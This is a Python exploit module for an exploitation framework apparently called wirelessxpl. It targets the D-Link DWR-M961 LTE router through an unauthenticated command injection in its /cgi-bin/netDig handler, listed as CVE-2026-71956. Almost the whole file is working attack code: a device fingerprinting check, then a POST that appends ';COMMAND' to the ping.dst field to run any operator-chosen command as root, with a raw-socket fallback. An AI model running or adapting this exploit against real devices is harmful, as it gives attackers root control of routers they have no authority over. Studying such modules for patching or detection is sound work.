# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""D-Link DWR-M961 Unauth Root Command Execution via netDig (CVE-2026-71956).

The D-Link DWR-M961 LTE router exposes a diagnostic CGI handler at
/cgi-bin/netDig that accepts a ``ping.dst`` parameter without authentication
or input sanitization.  An attacker can inject arbitrary shell commands via
the ping.dst field, which are executed as root by the underlying busybox
shell.

CVSS v3.1: 9.8 (Critical) - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Affected: D-Link DWR-M961 firmware <= 1.1.36
"""

import socket
import time
from urllib.parse import quote

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit

try:
    import requests

    _HAS_REQUESTS = True
except ImportError:
    _HAS_REQUESTS = False


class Exploit(BaseExploit):
    """D-Link DWR-M961 Unauth Root Command Execution via netDig (CVE-2026-71956)."""

    __info__ = {
        "name": "D-Link DWR-M961 Unauth Root RCE via netDig (CVE-2026-71956)",
        "description": (
            "Command injection in the /cgi-bin/netDig diagnostic handler "
            "on the D-Link DWR-M961 LTE router.  The ping.dst parameter "
            "is passed unsanitized to a system() call, allowing "
            "unauthenticated remote command execution as root."
        ),
        "authors": (
            "Security Researcher (discovery / CVE)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-71956",
            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-71956",
            "https://supportannouncement.us.dlink.com/security/",
        ),
        "devices": (
            "D-Link DWR-M961 (firmware <= 1.1.36)",
        ),
        "cve": "CVE-2026-71956",
        "cvss": "9.8",
        "severity": "CRITICAL",
        "mitre_techniques": ["T1059", "T1190"],
        "mitre_tactics": ["Execution", "Initial Access"],
    }

    target = OptIP("", "Target IPv4 address of the D-Link DWR-M961")
    port = OptPort(80, "HTTP management port (default 80)")
    timeout = OptFloat(8.0, "HTTP request timeout in seconds")
    command = OptString("id", "Command to inject (PoC only)")
    use_https = OptBool(False, "Use HTTPS instead of HTTP")

    _CGI_PATH = "/cgi-bin/netDig"

    def _base_url(self) -> str:
        scheme = "https" if self.use_https else "http"
        return f"{scheme}://{self.target}:{self.port}"

    def _probe_model(self) -> bool:
        """Check if the target responds and identifies as a DWR-M961."""
        if not _HAS_REQUESTS:
            return self._probe_model_socket()
        try:
            resp = requests.get(
                self._base_url(),
                timeout=self.timeout,
                verify=False,
                allow_redirects=True,
            )
            body = resp.text.lower()
            return "dwr-m961" in body or "d-link" in resp.headers.get("Server", "").lower()
        except Exception:
            return False

    def _probe_model_socket(self) -> bool:
        """Fallback model probe using raw sockets."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.target, self.port))
            sock.sendall(
                f"GET / HTTP/1.0\r\nHost: {self.target}\r\n\r\n".encode()
            )
            data = sock.recv(4096).decode(errors="replace").lower()
            sock.close()
            return "dwr-m961" in data or "d-link" in data
        except (ConnectionRefusedError, TimeoutError, OSError):
            return False

    @mute
    def check(self) -> bool:
        """Verify the target is a D-Link DWR-M961 with the netDig handler."""
        if not self._probe_model():
            return False
        # Probe the CGI endpoint itself
        if _HAS_REQUESTS:
            try:
                resp = requests.get(
                    f"{self._base_url()}{self._CGI_PATH}",
                    timeout=self.timeout,
                    verify=False,
                )
                return resp.status_code in (200, 400, 500)
            except Exception:
                return False
        return True

    def run(self) -> None:
        if not self.target:
            print_error("Target IP address is required")
            return

        if not self.check():
            print_error(
                f"Target {self.target}:{self.port} does not appear to be a vulnerable DWR-M961"
            )
            return

        print_success(f"DWR-M961 detected at {self.target}:{self.port}")
        self._exploit()

    def _exploit(self) -> None:
        """Inject a command via the netDig ping.dst parameter."""
        # The injection uses shell metacharacters to break out of the ping
        # command context: 127.0.0.1;COMMAND
        injected = f"127.0.0.1;{self.command}"

        print_status(
            f"Sending command injection to {self._base_url()}{self._CGI_PATH}"
        )

        if _HAS_REQUESTS:
            try:
                resp = requests.post(
                    f"{self._base_url()}{self._CGI_PATH}",
                    data={"ping.dst": injected},
                    timeout=self.timeout,
                    verify=False,
                )
                if resp.status_code == 200:
                    print_success("Command injected successfully")
                    if resp.text.strip():
                        print_info(f"Response body:\n{resp.text[:2048]}")
                else:
                    print_warning(
                        f"Received HTTP {resp.status_code}; injection may still have succeeded"
                    )
            except Exception as exc:
                print_error(f"HTTP request failed: {exc}")
        else:
            # Raw socket fallback
            body = f"ping.dst={quote(injected)}"
            request = (
                f"POST {self._CGI_PATH} HTTP/1.1\r\n"
                f"Host: {self.target}\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n"
                f"Content-Length: {len(body)}\r\n"
                f"Connection: close\r\n\r\n"
                f"{body}"
            )
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.timeout)
                sock.connect((self.target, self.port))
                sock.sendall(request.encode())
                time.sleep(1.0)
                data = sock.recv(8192).decode(errors="replace")
                sock.close()
                print_success("Command injection sent via raw socket")
                if data:
                    print_info(f"Response:\n{data[:2048]}")
            except (ConnectionRefusedError, TimeoutError, OSError) as exc:
                print_error(f"Socket connection failed: {exc}")
